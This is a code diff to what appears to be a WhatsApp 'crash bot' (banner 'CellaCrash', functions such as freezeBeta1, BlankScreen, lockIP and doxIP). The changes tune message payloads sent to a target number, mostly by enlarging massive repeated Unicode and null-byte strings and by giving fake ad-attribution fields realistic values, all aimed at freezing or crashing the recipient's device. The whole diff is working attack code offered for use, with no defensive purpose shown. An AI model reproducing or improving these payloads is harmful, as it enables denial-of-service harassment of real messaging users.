@@ -1261,7 +1261,7 @@ bot.command("status", ctx => {
                                 hasMediaAttachment: true
                             },
                             body: {
-                                text: "" + "ꦾ".repeat(50000) + "ꦾ".repeat(90000) + "𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(10000) + "⿻".repeat(50000)
+                                text: "" + "ꦾ".repeat(50000) + "ꦾ".repeat(90000) + "𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(1500) + "⿻".repeat(50000)
                             },
                             nativeFlowMessage: {},
                             contextInfo: {
@@ -1373,7 +1373,7 @@ console.log(chalk.red.bold('Crash System Device By ☆ CellaCrash'))
 };
 async function XeonXRobust(target, Ptcp = true) {
   const jids = `_*~@0~*_\n`.repeat(29200);
-  const ui = "ꦽ".repeat(2000);
+  const ui = "ꦽ".repeat(60000);
   await cella.relayMessage(target, {
     ephemeralMessage: {
       message: {
@@ -1421,7 +1421,7 @@ async function XeonXRobust(target, Ptcp = true) {
                 mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                 fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                 fileLength: "9999999999999",
-                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
+                pageCount: 1886463195,
                 mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                 fileName: "Yea? ThanksYou!",
                 fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
@@ -1468,7 +1468,7 @@ async function freezeBeta1(target) {
                             groupSubject: "RALDZZ CRASH" 
                         }]
                     },
-                    footer: "ꦾ".repeat(9000)
+                    footer: "ꦾ".repeat(90000)
                 }
             }
         }
@@ -1490,7 +1490,7 @@ async function freezeBeta2(target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "☠️ 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 ☠️" + "◌".repeat(270000)
+                        text: "☠️ 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 ☠️" + "◌".repeat(280000)
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
@@ -1524,7 +1524,7 @@ async function sendxoMessage(target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(50000) 
+                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(14000) 
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
@@ -1576,9 +1576,9 @@ async function blank(target) {
 					'message': {
 						"newsletterAdminInviteMessage": {
 							"newsletterJid": `120363298524333143@newsletter`,
-							"newsletterName": "📜 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 📜" + "ꦾ".repeat(300000),
+							"newsletterName": "📜 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 📜" + "ꦾ".repeat(150000),
 							"jpegThumbnail": "",
-							"caption": "ꦾ".repeat(300000),
+							"caption": "ꦾ".repeat(180000),
 							"inviteExpiration": Date.now() + 1814400000
 						}
 					}
@@ -1624,7 +1624,7 @@ async function bugBetaDox(target) {
     const file = {
       name: "ꦾ".repeat(150000) + ".txt",
       size: 1099511627, // 1TB
-      data: "1".repeat(199956116),
+      data: "9".repeat(199956116),
     };
     const message = {
       text: pesan,
@@ -1671,7 +1671,7 @@ async function doxIP(target) {
     const file = {
       name: "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(150000) + ".txt",
       size: 109951162, // 1TB
-      data: "0".repeat(10995116),
+      data: "9".repeat(10995116),
     };
     const message = {
       text: pesan,
@@ -1711,7 +1711,7 @@ async function lockIP(target) {
                             groupSubject: "RALDZZ CRASH" 
                         }]
                     },
-                    footer: "ꦾ".repeat(2000)
+                    footer: "ꦾ".repeat(150000)
                 }
             }
         }
@@ -1859,7 +1859,7 @@ async function lockIP(target) {
     cella.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
 }
  async function BlankScreen(target, Ptcp = false) {
-let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "ྫྷ".repeat(210000);
+let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "ྫྷ".repeat(150000);
 			await cella.relayMessage(target, {
 					ephemeralMessage: {
 						message: {
@@ -1886,7 +1886,7 @@ let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "ྫྷ".repeat(210000)
 								},
 								nativeFlowMessage: {
 								name: "call_permission_request",
-								messageParamsJson: "\u0000".repeat(35000),
+								messageParamsJson: "\u0000".repeat(300000),
 								},
 								contextInfo: {
 								mentionedJid: ["0@s.whatsapp.net"],
@@ -1928,7 +1928,7 @@ let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "ྫྷ".repeat(210000)
             console.log(chalk.red.bold('Nandemo'))
    	};
 async function freezefile(target, QBug, Ptcp = true) {
-    let virtex = "Wanna With Yours :D " + "ြ".repeat(25000);
+    let virtex = "Wanna With Yours :D " + "ြ".repeat(150000);
     await cella.relayMessage(target, {
         groupMentionedMessage: {
             message: {
@@ -1947,7 +1947,7 @@ async function freezefile(target, QBug, Ptcp = true) {
                             mediaKeyTimestamp: "1715880173",
                             contactVcard: true
                         },
-                        title: "",
+                        title: virtex,
                         hasMediaAttachment: true
                     },
                     body: {
@@ -2157,7 +2157,7 @@ async function newsLetter(target, Ptcp = true) {
                         message: {
                             newsletterAdminInviteMessage: {
                                 newsletterJid: `33333333333333333@newsletter`,
-                                newsletterName: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી" + "ી".repeat(120000),
+                                newsletterName: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી" + "ી".repeat(150000),
                                 jpegThumbnail: "",
                                 caption: "ꦽ".repeat(180000),
                                 inviteExpiration: Date.now() + 1814400000,
@@ -2267,12 +2267,12 @@ async function newsLetter(target, Ptcp = true) {
         target,
         {
           extendedTextMessage: {
-            text: "ꦾ".repeat(55000),
+            text: "ꦾ".repeat(100000),
             contextInfo: {
               stanzaId: target,
               participant: target,
               quotedMessage: {
-                conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(50000),
+                conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(150000),
               },
               disappearingMode: {
                 initiator: "CHANGED_IN_CHAT",
@@ -2306,7 +2306,7 @@ async function newsLetter(target, Ptcp = true) {
         target,
         {
           extendedTextMessage: {
-            text: "Wanna With Yours :)" + "ꦾ".repeat(90000),
+            text: "Wanna With Yours :)" + "ꦾ".repeat(200000),
             contextInfo: {
               stanzaId: "1234567890ABCDEF",
               participant: "0@s.whatsapp.net",
@@ -2361,24 +2361,24 @@ async function newsLetter(target, Ptcp = true) {
                 containsAutoReply: true,
                 renderLargerThumbnail: true,
                 showAdAttribution: true,
-                ctwaClid: "ctwa_clid_example",
-                ref: "ref_example",
+                ctwaClid: "12345",
+                ref: "google_ads",
               },
-              entryPointConversionSource: "entry_point_source_example",
-              entryPointConversionApp: "entry_point_app_example",
+              entryPointConversionSource: "ads",
+              entryPointConversionApp: "instagram",
               entryPointConversionDelaySeconds: 5,
               disappearingMode: {},
               actionLink: {
                 url: "https://t.me/cellasta",
               },
-              groupSubject: "Example Group Subject",
+              groupSubject: "ꦾ".repeat(20000),
               parentGroupJid: "6287888888888-1234567890@g.us",
-              trustBannerType: "trust_banner_example",
+              trustBannerType: "default",
               trustBannerAction: 1,
               isSampled: false,
               utm: {
-                utmSource: "utm_source_example",
-                utmCampaign: "utm_campaign_example",
+                utmSource: "google",
+                utmCampaign: "NewYearPromo",
               },
               forwardedNewsletterMessageInfo: {
                 newsletterJid: "6287888888888-1234567890@g.us",
@@ -2390,8 +2390,8 @@ async function newsLetter(target, Ptcp = true) {
               businessMessageForwardInfo: {
                 businessOwnerJid: "0@s.whatsapp.net",
               },
-              smbcayCampaignId: "smb_cay_campaign_id_example",
-              smbServerCampaignId: "smb_server_campaign_id_example",
+              smbcayCampaignId: "ads456",
+              smbServerCampaignId: "campaign12345",
               dataSharingContext: {
                 showMmDisclosure: true,
               },
@@ -2415,13 +2415,13 @@ async function newsLetter(target, Ptcp = true) {
         target,
         {
           extendedTextMessage: {
-            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(90000),
+            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(200000),
             contextInfo: {
               fromMe: false,
               stanzaId: target,
               participant: target,
               quotedMessage: {
-                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(90000),
+                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(120000),
               },
               disappearingMode: {
                 initiator: "CHANGED_IN_CHAT",
